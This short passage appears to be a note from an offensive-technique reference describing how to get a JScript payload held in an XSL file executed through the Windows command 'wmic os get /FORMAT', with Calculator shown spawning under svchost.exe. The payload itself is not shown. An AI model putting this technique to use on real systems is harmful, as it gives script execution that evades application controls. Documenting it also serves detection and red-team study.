Define the XSL file containing the jscript payload:
```
file.xsl
```
Invoke any wmic command now and specify /format pointing to the file.xsl:
```
wmic os get /FORMAT:"file.xsl"
```
Calculator is spawned by svchost.exe:

![image](https://github.com/user-attachments/assets/9be8f30e-5e05-42e4-a813-a53fb1fc436a)
